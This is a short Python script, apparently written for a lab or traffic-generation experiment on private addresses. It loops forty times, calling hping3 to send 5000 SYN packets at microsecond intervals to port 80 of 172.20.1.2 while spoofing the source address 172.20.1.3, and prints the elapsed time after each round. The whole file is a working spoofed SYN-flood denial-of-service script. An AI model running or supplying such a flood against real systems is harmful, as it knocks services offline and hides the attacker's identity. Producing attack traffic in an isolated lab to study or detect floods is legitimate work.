import subprocess, time, sys

now = time.perf_counter()

time.sleep(30)

for j in range(40):
  start = time.time()
  subprocess.call('hping3 -c 5000 -S -p 80 -i u100 -a 172.20.1.3 172.20.1.2', shell=True)
  sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
  tempo = time.time()-start
  if tempo < 10:
    time.sleep(10-tempo)
